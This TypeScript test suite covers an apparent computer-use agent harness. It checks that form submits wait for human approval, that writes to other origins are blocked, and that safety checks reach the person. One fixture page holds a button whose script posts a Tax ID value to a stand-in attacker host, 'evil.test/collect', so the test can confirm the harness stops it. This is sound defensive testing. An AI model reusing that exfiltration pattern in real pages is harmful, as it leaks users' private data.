import { type CuReply, type CuTurn, DockhandError, type TraceStep } from "@dockhand/core";
import type { Browser, BrowserContext, Page } from "playwright";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from "vitest";
import { REGISTER_FORM } from "../helpers/fixtures.ts";
import { pngSize } from "../png.ts";
import { createScriptedModel } from "../scripted.ts";
import {
  centreOf,
  FIXTURE_ORIGIN,
  type FixtureServer,
  fixtureContext,
  launchTestBrowser,
} from "../test-support.ts";
import { CTX, cannedModel, cuInput, recordingHooks } from "./cu-test-kit.ts";
import { runComputerUse } from "./loop.ts";

const STALE_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
  <div style="padding:20px"><label for=cb>Country</label>
    <input id=cb role=combobox aria-expanded=false aria-controls=lb onclick="lb.hidden=false;this.setAttribute('aria-expanded','true')"></div>
  <ul id=lb role=listbox hidden style="position:absolute;top:60px;left:20px;margin:0;padding:0;list-style:none;background:#fff;border:1px solid #999;width:220px">
    <li role=option>Argentina</li><li role=option>Brazil</li><li role=option>Chile</li></ul>
  <div style="padding:20px"><label for=city>City</label> <input id=city></div>
  <p style="padding:20px">Some text</p></body>`;

const LEAVE_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
  <div style="padding:20px"><label for=c>Company name</label> <input id=c value="Sabiá Foods Ltda"></div>
  <a href="/form" style="display:block;padding:20px">Open the full form</a></body>`;

const LONG_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
  <a href="/next" id=go style="display:block;padding:20px">Go to the next page</a>
  <button id=first style="margin:20px">First</button>
  <div style="height:2000px"></div><button id=far>Far button</button>
  <button id=save onclick="fetch('/api/save', { method: 'POST', body: '{}' })">Go</button></body>`;

// A portal page that links to and posts to another origin (a hostile or compromised page).
const OFFSITE_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
  <div style="padding:20px"><label for=tin>Tax ID</label> <input id=tin value="12-3456789"></div>
  <a href="http://evil.test/verify" style="display:block;padding:20px">Partner check</a>
  <button style="margin:20px" onclick="fetch('http://evil.test/collect', { method: 'POST', body: tin.value })">Verify partner</button></body>`;

// Filled, but the control that submits is a plain span the harness cannot identify; another button writes.
const UNBOUND_PAGE = `<!doctype html><body style="margin:0;font-family:system-ui">
  <div style="padding:20px"><label for=c>Company name</label> <input id=c value="Sabiá Foods Ltda"></div>
  <button style="margin:20px" onclick="fetch('/api/contacts/remove', { method: 'POST', body: '{}' })">Remove contact</button>
  <span tabindex=0 style="margin:20px;padding:8px" onclick="fetch('/api/register', { method: 'POST', body: '{}' })">Send it</span></body>`;

let browser: Browser;
let context: BrowserContext;
let page: Page;
let server: FixtureServer;

beforeAll(async () => {
  browser = await launchTestBrowser();
});
afterAll(async () => {
  await browser?.close();
});
beforeEach(async () => {
  ({ context, page, server } = await fixtureContext(browser, {
    "/form": REGISTER_FORM,
    "/stale": STALE_PAGE,
    "/long": LONG_PAGE,
    "/next": "<!doctype html><h1>Next page</h1>",
    "/leave": LEAVE_PAGE,
    "/offsite": OFFSITE_PAGE,
    "/unbound": UNBOUND_PAGE,
  }));
});
// One context per test, closed after it: 18 contexts left open in one Chromium add up under a loaded suite.
afterEach(async () => {
  await context?.close().catch(() => {});
});

const tagsOf = (steps: TraceStep[]) => steps.map((s) => `${s.action.type}:${s.tags.join("+")}`);
const posts = () => server.hits.filter((h) => h.method === "POST");
const notes = (replies: CuReply[]) =>
  replies.map((r) => (r.kind === "computer_output" ? (r.note ?? "") : "")).filter(Boolean);

describe("runComputerUse: commit guard", () => {
  it("an approval asked on a page with no submit control cannot release a later submit elsewhere", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/leave`);
    const model = createScriptedModel(
      [
        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods Ltda" } },
        { do: "click", target: { role: "link", name: "Open the full form" } },
        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
        { do: "click", target: { role: "button", name: "Submit registration" } },
        { do: "done", text: "Stopped." },
      ],
      page,
    );
    const hooks = recordingHooks("approved");
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(hooks.commits).toHaveLength(0); // nothing to bind on /leave, so the rep is not asked
    const submit = r.trace.steps.find(
      (s) => s.action.type === "click" && s.target?.fingerprint.name === "Submit registration",
    );
    expect(submit?.tags).toEqual(["blocked"]);
    expect(posts()).toHaveLength(0);
  });

  it("blocks an unapproved submit click; after approval the harness clicks the approved button", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
        { do: "click", target: { role: "button", name: "Submit registration" } },
        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods Ltda" } },
        { do: "done", text: "Submitted." },
      ],
      page,
    );
    const hooks = recordingHooks("approved");
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(r.outcome).toBe("done");
    const clicks = r.trace.steps.filter(
      (s) => s.action.type === "click" && s.target?.fingerprint.name === "Submit registration",
    );
    expect(clicks.map((s) => s.tags)).toEqual([["blocked"], expect.arrayContaining(["commit"])]);
    expect(posts()).toHaveLength(1);
    expect(notes(model.replies).some((n) => /Call request_commit/.test(n))).toBe(true);
    // The approval card carries a screenshot, the read-back and the highlighted submit button.
    expect(hooks.commits).toHaveLength(1);
    expect(hooks.commits[0]?.readback).toContainEqual({ label: "Company name", value: "Sabiá Foods Ltda" });
    expect(hooks.commits[0]?.highlight?.w).toBeGreaterThan(0);
    const fn = r.trace.steps.find((s) => s.action.type === "fn");
    expect(fn?.formSnapshotBefore?.["Company name"]).toBe("Sabiá Foods Ltda");
  });

  it("blocks Enter in a field of a form whose default button submits", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
        { do: "press", keys: ["ENTER"] },
        { do: "done", text: "Stopped." },
      ],
      page,
    );
    const r = await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    const enter = r.trace.steps.find((s) => s.action.type === "keypress" && s.tags.includes("blocked"));
    expect(enter?.target?.fingerprint.name).toBe("Company name");
    expect(posts()).toHaveLength(0);
  });

  it("ends as rejected when the rep rejects, without submitting", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "call", name: "request_commit", args: { summary: "Register" } },
        { do: "click", target: { role: "button", name: "Submit registration" } },
      ],
      page,
    );
    const r = await runComputerUse(model, cuInput(page), recordingHooks("rejected"), CTX);
    expect(r.outcome).toBe("rejected");
    expect(posts()).toHaveLength(0);
  });

  it("answers not_ready without asking the rep when required fields are empty", async () => {
    await page.setContent(`<form onsubmit="event.preventDefault()"><label for=a>Company</label><input id=a required>
      <button>Submit</button></form>`);
    const model = createScriptedModel([{ do: "call", name: "request_commit", args: { summary: "x" } }], page);
    const hooks = recordingHooks();
    await runComputerUse(model, cuInput(page), hooks, CTX);
    const out = model.replies.find((r) => r.kind === "function_output");
    expect(out?.kind === "function_output" && out.output).toMatch(/^not_ready: "Company" is empty/);
    expect(hooks.commits).toHaveLength(0);
  });

  it('answers not_needed on an entry page ("Start registration"), so the rep never approves an empty form', async () => {
    await page.setContent(`<h1>You've been invited to register as a supplier</h1>
      <button type="button" onclick="this.textContent='Starting…'">Start registration</button>`);
    const model = createScriptedModel(
      [
        { do: "call", name: "request_commit", args: { summary: "Start the supplier registration" } },
        { do: "click", target: { role: "button", name: "Start registration" } },
        { do: "done", text: "Started." },
      ],
      page,
    );
    const hooks = recordingHooks();
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    const out = model.replies.find((x) => x.kind === "function_output");
    expect(out?.kind === "function_output" && out.output).toMatch(
      /^not_needed: nothing on this page submits/,
    );
    expect(hooks.commits).toHaveLength(0);
    expect(r.trace.steps.some((s) => s.tags.includes("commit") || s.tags.includes("blocked"))).toBe(false);
  });

  it("holds writes the commit guard did not classify (network backstop)", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    await page.evaluate(() => window.scrollTo(0, document.body.scrollHeight));
    const model = createScriptedModel(
      [
        { do: "click", target: { role: "button", name: "Go" } },
        { do: "done", text: "ok" },
      ],
      page,
    );
    const r = await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    const click = r.trace.steps.find((s) => s.action.type === "click");
    expect(click?.tags).toContain("blocked");
    expect(server.hits.filter((h) => h.url.endsWith("/api/save"))).toHaveLength(0);
    expect(notes(model.replies).some((n) => /POST to \/api\/save was blocked/.test(n))).toBe(true);
  });

  it("aborts a link and a write to another origin: nothing leaves the portal, even with no approval asked", async () => {
    const evil: string[] = [];
    await context.route("http://evil.test/**", (route) => {
      evil.push(`${route.request().method()} ${route.request().url()}`);
      return route.fulfill({ status: 200, contentType: "text/html", body: "<h1>Partner check</h1>" });
    });
    await page.goto(`${FIXTURE_ORIGIN}/offsite`);
    const model = createScriptedModel(
      [
        { do: "click", target: { role: "link", name: "Partner check" } },
        { do: "click", target: { role: "button", name: "Verify partner" } },
        { do: "done", text: "ok" },
      ],
      page,
    );
    const hooks = recordingHooks("approved");
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(evil).toEqual([]);
    expect(hooks.commits).toHaveLength(0);
    expect(page.url()).toBe(`${FIXTURE_ORIGIN}/offsite`);
    expect(await page.inputValue("#tin")).toBe("12-3456789"); // the page was not replaced
    expect(
      r.blockedForeign?.map((f) => `${f.method} ${new URL(f.url).pathname} nav=${f.navigation}`),
    ).toEqual(["GET /verify nav=true", "POST /collect nav=false"]);
    expect(r.trace.steps.filter((s) => s.action.type === "click").map((s) => s.tags)).toEqual([
      ["blocked"],
      ["blocked"],
    ]);
  });

  it("in propose_only mode returns the proposed target without clicking it", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "click", target: { role: "button", name: "Submit registration" } },
        {
          do: "call",
          name: "propose_target",
          args: { target: { role: "button", name: "Submit registration" }, why: "the submit button" },
        },
      ],
      page,
    );
    const input = cuInput(page, { commitPolicy: "propose_only" });
    const r = await runComputerUse(model, input, recordingHooks(), CTX);
    expect(r.outcome).toBe("done");
    expect(r.proposed?.fingerprint.name).toBe("Submit registration");
    expect(r.proposed?.candidates[0]).toEqual({ by: "testid", value: "submit-reg" });
    expect(r.trace.steps[0]?.tags).toEqual(["blocked"]);
    expect(posts()).toHaveLength(0);
    expect(model.sessions[0]?.functions.map((f) => f.name)).toEqual(["propose_target"]);
  });
});

describe("runComputerUse: batches and trace", () => {
  it("stops a batch whose next click lands where the page changed (stale coordinates)", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/stale`);
    const cb = await centreOf(page, "#cb");
    const city = await centreOf(page, "#city");
    const model = cannedModel([
      [
        {
          kind: "computer_call",
          callId: "c1",
          safetyChecks: [],
          actions: [
            { type: "click", x: cb.x, y: cb.y },
            { type: "click", x: city.x, y: city.y - 10 }, // the guessed spot: the opened listbox covers it now
          ],
        },
      ],
    ]);
    const r = await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    expect(r.trace.steps).toHaveLength(1);
    expect(r.trace.steps[0]?.target?.fingerprint.role).toBe("combobox");
    expect(notes(model.replies)[0]).toMatch(/page changed after your last screenshot/);
  });

  it("stops a batch after a navigation and after a scroll", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const go = await centreOf(page, "#go");
    const first = await centreOf(page, "#first");
    const model = cannedModel([
      [
        {
          kind: "computer_call",
          callId: "s1",
          safetyChecks: [],
          actions: [
            { type: "scroll", x: 640, y: 400, scroll_x: 0, scroll_y: 300 },
            { type: "click", x: first.x, y: first.y },
          ],
        },
      ],
      [
        {
          kind: "computer_call",
          callId: "s2",
          safetyChecks: [],
          actions: [{ type: "scroll", x: 640, y: 400, scroll_x: 0, scroll_y: -300 }],
        },
      ],
      [
        {
          kind: "computer_call",
          callId: "n1",
          safetyChecks: [],
          actions: [
            { type: "click", x: go.x, y: go.y },
            { type: "click", x: first.x, y: first.y },
          ],
        },
      ],
    ]);
    const r = await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    expect(tagsOf(r.trace.steps)).toEqual(["scroll:noise", "scroll:noise", "click:navigation"]);
    expect(r.trace.steps[2]?.urlAfter).toBe(`${FIXTURE_ORIGIN}/next`);
    expect(r.trace.final.url).toBe(`${FIXTURE_ORIGIN}/next`);
    expect(r.trace.final.text).toContain("Next page");
  });

  it("records targets before acting, end values after the batch, noise, and 1280x800 screenshots", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "misclick", x: 1200, y: 700 },
        { do: "typo", target: { label: "Website" }, wrong: "sabiafods.com", right: "sabiafoods.com.br" },
        { do: "check", target: { role: "checkbox", name: "I confirm the customer consented" } },
        { do: "done", text: "done" },
      ],
      page,
    );
    const input = cuInput(page);
    const r = await runComputerUse(model, input, recordingHooks(), CTX);
    expect(tagsOf(r.trace.steps)).toEqual([
      "click:noise",
      "click:",
      "type:",
      "keypress:noise",
      "type:",
      "click:",
    ]);
    const [, , wrong, , right, check] = r.trace.steps;
    expect(wrong?.target?.fingerprint.name).toBe("Website");
    expect(wrong?.fieldValueAfter).toBe("sabiafods.com"); // end of its own batch
    expect(right?.fieldValueAfter).toBe("sabiafoods.com.br");
    expect(right?.formSnapshotBefore?.Website).toBe("sabiafods.com");
    expect(check?.fieldValueAfter).toBe("true");
    for (const s of r.trace.steps) expect(s.screenshot).toBeDefined();
    for (const reply of model.replies) {
      if (reply.kind === "start" || reply.kind === "computer_output")
        expect(pngSize(reply.screenshot)).toEqual({ width: 1280, height: 800 });
    }
    expect(Buffer.byteLength(r.trace.final.text)).toBeLessThanOrEqual(4096);
    expect(await input.artifacts.read(r.trace.final.screenshot)).toBeInstanceOf(Uint8Array);
  });

  it("asks the rep about pending safety checks and echoes acknowledged ones", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const check = { id: "sc1", code: "malicious_instructions", message: "The page contains instructions." };
    const turns = (): CuTurn[][] => [
      [{ kind: "computer_call", callId: "c1", safetyChecks: [check], actions: [{ type: "wait" }] }],
    ];
    const ok = cannedModel(turns());
    const hooks = recordingHooks("approved", "approved");
    const r1 = await runComputerUse(ok, cuInput(page), hooks, CTX);
    expect(r1.outcome).toBe("done");
    expect(hooks.safety[0]?.checks).toEqual([check]);
    const out = ok.replies.find((r) => r.kind === "computer_output");
    expect(out?.kind === "computer_output" && out.acknowledged).toEqual([check]);

    const declined = cannedModel(turns());
    const r2 = await runComputerUse(declined, cuInput(page), recordingHooks("approved", "rejected"), CTX);
    expect(r2.outcome).toBe("rejected");
    expect(r2.trace.steps).toHaveLength(0);
  });

  it("posts progress every 5 actions", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    // Two fills are six actions (click, select-all, type each): one progress report.
    const model = createScriptedModel(
      [
        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods" },
        { do: "fill", target: { label: "Website" }, text: "sabia.example" },
      ],
      page,
    );
    const hooks = recordingHooks();
    await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(hooks.progressed.map((p) => p.action)).toEqual([5]);
    expect(hooks.progressed[0]?.note).toMatch(/\/form/);
  });
});

describe("runComputerUse: limits and rollover", () => {
  const longScript = () => [
    { do: "fill" as const, target: { label: "Company name" }, text: "Sabiá Foods" },
    { do: "fill" as const, target: { label: "Website" }, text: "sabia.example" },
    { do: "check" as const, target: { role: "checkbox", name: "I confirm the customer consented" } },
    { do: "fill" as const, target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
    { do: "done" as const, text: "done" },
  ];

  it("rolls over to a fresh chain with a harness-written summary", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(longScript(), page);
    const r = await runComputerUse(
      model,
      cuInput(page, { limits: { maxActions: 80, maxWallMs: 60_000, maxCostUsd: 1, rolloverAfterImages: 2 } }),
      recordingHooks(),
      CTX,
    );
    expect(r.outcome).toBe("done");
    const rollovers = model.replies.filter((x) => x.kind === "rollover");
    expect(rollovers.length).toBeGreaterThanOrEqual(1);
    const summary = rollovers[0]?.kind === "rollover" ? rollovers[0].summary : "";
    expect(summary).toContain("Goal: Register the deal for Sabiá Foods");
    expect(summary).toMatch(/typed "Sabiá Foods" into "Company name"/);
    expect(summary).toContain("Current page: http://portal.test/form");
    expect(summary).toMatch(/not been approved yet/);
    expect(await page.getByLabel("Company name").inputValue()).toBe("Sabiá Foods Ltda");
  });

  it("stops with budget_exceeded on the action budget", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const r = await runComputerUse(
      createScriptedModel(longScript(), page),
      cuInput(page, { limits: { maxActions: 4, maxWallMs: 60_000, maxCostUsd: 1, rolloverAfterImages: 50 } }),
      recordingHooks(),
      CTX,
    );
    expect(r.outcome).toBe("budget_exceeded");
    expect(r.message).toMatch(/action budget of 4/);
    expect(r.trace.steps.filter((s) => s.action.type !== "fn")).toHaveLength(4);
    expect(r.trace.outcome).toBe("budget_exceeded");
  });

  it("stops with budget_exceeded when the ledger cost passes maxCostUsd", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(longScript(), page, { costPerTurnUsd: 0.2 });
    const r = await runComputerUse(
      model,
      cuInput(page, {
        costSoFar: () => model.replies.length * 0.2,
        limits: { maxActions: 80, maxWallMs: 60_000, maxCostUsd: 0.5, rolloverAfterImages: 50 },
      }),
      recordingHooks(),
      CTX,
    );
    expect(r.outcome).toBe("budget_exceeded");
    expect(r.message).toMatch(/over the \$0.5 budget/);
    expect(model.replies).toHaveLength(3);
  });

  it("stops with budget_exceeded on wall clock, not counting time spent waiting for the rep", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    let now = 0;
    const clock = { now: () => now };
    const hooks = recordingHooks("approved");
    const approve = hooks.approveCommit.bind(hooks);
    hooks.approveCommit = async (r) => {
      now += 600_000; // the rep took ten minutes
      return approve(r);
    };
    const model = createScriptedModel(
      [
        { do: "call", name: "request_commit", args: { summary: "x" } },
        { do: "fill", target: { label: "Company name" }, text: "Sabiá" },
        { do: "fill", target: { label: "Website" }, text: "sabia.example" },
      ],
      page,
    );
    // Every model turn takes 20 s of wall clock.
    const open = model.open.bind(model);
    model.open = (o) => {
      const session = open(o);
      return {
        imagesInChain: () => session.imagesInChain(),
        send: (reply, ctx) => {
          now += 20_000;
          return session.send(reply, ctx);
        },
      };
    };
    const r = await runComputerUse(
      model,
      cuInput(page, {
        limits: { maxActions: 80, maxWallMs: 50_000, maxCostUsd: 1, rolloverAfterImages: 50 },
      }),
      hooks,
      CTX,
      { clock },
    );
    expect(r.outcome).toBe("budget_exceeded");
    expect(r.message).toMatch(/wall clock 60000 ms over the 50000 ms budget/);
    expect(hooks.commits).toHaveLength(1);
  });

  it("resends once on an incomplete response, then fails", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const once = cannedModel([
      [{ kind: "incomplete", reason: "max_output_tokens" }],
      [{ kind: "final", text: "ok" }],
    ]);
    expect((await runComputerUse(once, cuInput(page), recordingHooks(), CTX)).outcome).toBe("done");
    expect(once.replies.map((r) => r.kind)).toEqual(["start", "start"]);
    const twice = cannedModel([
      [{ kind: "incomplete", reason: "max_output_tokens" }],
      [{ kind: "incomplete", reason: "max_output_tokens" }],
    ]);
    const r = await runComputerUse(twice, cuInput(page), recordingHooks(), CTX);
    expect(r.outcome).toBe("failed");
    expect(r.message).toMatch(/MODEL_INCOMPLETE/);
  });

  it("stops when the call is aborted", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const controller = new AbortController();
    controller.abort();
    const r = await runComputerUse(cannedModel([]), cuInput(page), recordingHooks(), {
      ...CTX,
      signal: controller.signal,
    });
    expect(r).toMatchObject({ outcome: "failed", message: "aborted" });
    expect(r.trace.final.screenshot.mime).toBe("image/png");
  });

  it("fails on a BLOCKED final message (task declared infeasible)", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel([{ do: "done", text: "BLOCKED: no value for Partner tier" }], page);
    const r = await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    expect(r.outcome).toBe("failed");
    expect(r.message).toMatch(/Partner tier/);
  });
});

describe("runComputerUse: Meta computer-tool conventions seen live", () => {
  const routine = {
    id: "cu_sc_1",
    code: "computer_action_requires_confirmation",
    message: "Review and confirm before executing this computer action.",
  };

  it("reads small scroll deltas as wheel notches of 100 px and large ones as pixels", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const scroll = (callId: string, dy: number): CuTurn[] => [
      {
        kind: "computer_call",
        callId,
        safetyChecks: [],
        actions: [{ type: "scroll", x: 640, y: 400, scroll_x: 0, scroll_y: dy }],
      },
    ];
    const model = cannedModel([scroll("s1", 4), scroll("s2", -200)]);
    await runComputerUse(model, cuInput(page), recordingHooks(), CTX);
    expect(await page.evaluate(() => window.scrollY)).toBe(200);
  });

  it("acknowledges computer_action_requires_confirmation by policy and asks the human for any other check", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const unsafe = {
      id: "cu_sc_2",
      code: "malicious_instructions",
      message: "Potentially unsafe action detected.",
    };
    const model = cannedModel([
      [{ kind: "computer_call", callId: "c1", safetyChecks: [routine], actions: [{ type: "wait" }] }],
      [{ kind: "computer_call", callId: "c2", safetyChecks: [routine, unsafe], actions: [{ type: "wait" }] }],
    ]);
    const hooks = recordingHooks();
    await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(hooks.safety.map((s) => s.checks)).toEqual([[unsafe]]);
    const acks = model.replies.map((r) => (r.kind === "computer_output" ? r.acknowledged : null));
    expect(acks).toEqual([null, [routine], [routine, unsafe]]);
  });
});

describe("runComputerUse: points the model cannot have seen", () => {
  it("refuses an off-screen click and an off-screen or non-control proposal instead of clamping them", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const far = await centreOf(page, "#first");
    const model = cannedModel([
      [
        {
          kind: "computer_call",
          callId: "c1",
          safetyChecks: [],
          actions: [{ type: "click", x: 558, y: 862 }],
        },
      ],
      [
        {
          kind: "function_call",
          callId: "f1",
          name: "propose_target",
          argsJson: '{"x":558,"y":862,"why":"below"}',
        },
      ],
      [
        {
          kind: "function_call",
          callId: "f2",
          name: "propose_target",
          argsJson: '{"x":900,"y":600,"why":"blank"}',
        },
      ],
      [
        {
          kind: "function_call",
          callId: "f3",
          name: "propose_target",
          argsJson: JSON.stringify({ x: far.x, y: far.y, why: "the button" }),
        },
      ],
    ]);
    const r = await runComputerUse(
      model,
      cuInput(page, { commitPolicy: "propose_only" }),
      recordingHooks(),
      CTX,
    );
    expect(r.trace.steps.filter((s) => s.action.type === "click")).toHaveLength(0);
    expect(notes(model.replies)[0]).toMatch(/outside the 1280x800 screenshot/);
    const outputs = model.replies.map((x) => (x.kind === "function_output" ? x.output : ""));
    expect(outputs[2]).toMatch(/outside the 1280x800 screenshot/);
    expect(outputs[3]).toMatch(/not a button or link|There is no control/);
    expect(r.outcome).toBe("done");
    expect(r.proposed?.fingerprint.name).toBe("First");
  });
});

describe("runComputerUse: a slow model turn", () => {
  it("keeps reporting progress while the turn is outstanding", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const slow = cannedModel([[{ kind: "final", text: "Done." }]]);
    const session = slow.open({ instructions: "", functions: [] });
    const model = {
      ...slow,
      open: () => ({
        imagesInChain: () => 1,
        send: async (reply: CuReply, ctx: typeof CTX) => {
          await new Promise((r) => setTimeout(r, 260));
          return session.send(reply, ctx);
        },
      }),
    };
    const hooks = recordingHooks();
    await runComputerUse(model, cuInput(page), hooks, CTX, { heartbeatMs: 60 });
    expect(hooks.progressed.length).toBeGreaterThanOrEqual(2);
    expect(hooks.progressed[0]?.note).toMatch(/^waiting for the model \(\d+ s\)$/);
  });
});

describe("runComputerUse: a turn the API never answers", () => {
  it("starts a fresh conversation from the harness summary instead of failing the run", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/long`);
    const canned = cannedModel([
      [{ kind: "computer_call", callId: "c1", safetyChecks: [], actions: [{ type: "wait" }] }],
      [{ kind: "final", text: "Done." }],
    ]);
    let failed = false;
    const inner = canned.open({ instructions: "", functions: [] });
    const model = {
      ...canned,
      open: () => ({
        imagesInChain: () => inner.imagesInChain(),
        send: async (reply: CuReply, ctx: typeof CTX) => {
          if (reply.kind === "computer_output" && !failed) {
            failed = true;
            throw new DockhandError("MODEL_TIMEOUT", "computer-use turn took over 30000 ms twice");
          }
          return inner.send(reply, ctx);
        },
      }),
    };
    const hooks = recordingHooks();
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(r.outcome).toBe("done");
    expect(canned.replies.map((x) => x.kind)).toEqual(["start", "rollover"]);
    expect(hooks.progressed.map((p) => p.note)).toContain("the model did not answer; starting a fresh turn");
  });
});

describe("runComputerUse: the approved click", () => {
  it("is made by the harness at the approved button's centre, so a model click 4 px off cannot miss it", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const box = await page.getByRole("button", { name: "Submit registration" }).boundingBox();
    if (!box) throw new Error("no submit button");
    const off = { x: Math.round(box.x + box.width / 2), y: Math.round(box.y + box.height + 4) };
    const company = await centreOf(page, "[data-testid=company]");
    const model = cannedModel([
      [
        {
          kind: "computer_call",
          callId: "c1",
          safetyChecks: [],
          actions: [
            { type: "click", x: company.x, y: company.y },
            { type: "type", text: "Sabiá Foods Ltda" },
          ],
        },
      ],
      [
        {
          kind: "function_call",
          callId: "f1",
          name: "request_commit",
          argsJson: '{"summary":"Register Sabiá Foods Ltda"}',
        },
      ],
      // What Spark did live after approval: click 4 px below the button.
      [
        {
          kind: "computer_call",
          callId: "c2",
          safetyChecks: [],
          actions: [{ type: "click", x: off.x, y: off.y }],
        },
      ],
      [{ kind: "final", text: "Submitted." }],
    ]);
    const hooks = recordingHooks("approved");
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(hooks.commits).toHaveLength(1);
    expect(posts()).toHaveLength(1);
    const commit = r.trace.steps.find((s) => s.tags.includes("commit"));
    expect(commit?.target?.fingerprint.name).toBe("Submit registration");
    expect(commit?.action).toMatchObject({
      type: "click",
      x: Math.round(box.x + box.width / 2),
      y: Math.round(box.y + box.height / 2),
    });
    const out = model.replies.find((x) => x.kind === "function_output");
    expect(out?.kind === "function_output" && out.output).toMatch(
      /^approved and submitted: Dockhand clicked "Submit registration"/,
    );
  });

  it("asks no approval and grants no token when no submit control can be bound", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/unbound`);
    const model = createScriptedModel(
      [
        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods" } },
        { do: "click", target: { role: "button", name: "Remove contact" } },
        { do: "done", text: "ok" },
      ],
      page,
    );
    const hooks = recordingHooks("approved");
    const r = await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(hooks.commits).toHaveLength(0);
    expect(posts()).toHaveLength(0); // the approval could not be spent on another write
    const out = model.replies.find((x) => x.kind === "function_output");
    expect(out?.kind === "function_output" && out.output).toMatch(/^not submitted: no control that submits/);
    expect(r.trace.steps.find((s) => s.action.type === "click")?.tags).toContain("blocked");
  });

  it("grants the write token only after the approved button is checked: an autosave cannot take it", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const model = createScriptedModel(
      [
        { do: "fill", target: { label: "Company name" }, text: "Sabiá Foods Ltda" },
        { do: "call", name: "request_commit", args: { summary: "Register Sabiá Foods Ltda" } },
        { do: "done", text: "Submitted." },
      ],
      page,
    );
    const hooks = recordingHooks("approved");
    const approve = hooks.approveCommit;
    hooks.approveCommit = async (req) => {
      // The page autosaves right as the rep taps Approve.
      await page.evaluate(() => {
        setTimeout(() => void fetch("/api/autosave", { method: "POST", body: "{}" }).catch(() => {}), 0);
      });
      return approve(req);
    };
    await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(posts().map((h) => new URL(h.url).pathname)).toEqual(["/api/register"]);
  });

  it("voids the approval when the approved button is gone by the time the rep approves", async () => {
    await page.goto(`${FIXTURE_ORIGIN}/form`);
    const company = await centreOf(page, "[data-testid=company]");
    const model = cannedModel([
      [
        {
          kind: "computer_call",
          callId: "c1",
          safetyChecks: [],
          actions: [
            { type: "click", x: company.x, y: company.y },
            { type: "type", text: "Sabiá Foods Ltda" },
          ],
        },
      ],
      [{ kind: "function_call", callId: "f1", name: "request_commit", argsJson: '{"summary":"Register"}' }],
      [{ kind: "final", text: "Stopped." }],
    ]);
    const hooks = recordingHooks("approved");
    const approve = hooks.approveCommit;
    hooks.approveCommit = async (r) => {
      await page.evaluate(() => document.querySelector("button[data-testid=submit-reg]")?.remove());
      return approve(r);
    };
    await runComputerUse(model, cuInput(page), hooks, CTX);
    expect(posts()).toHaveLength(0);
    const out = model.replies.find((x) => x.kind === "function_output");
    expect(out?.kind === "function_output" && out.output).toMatch(/^not submitted: .*no longer on the page/);
  });
});
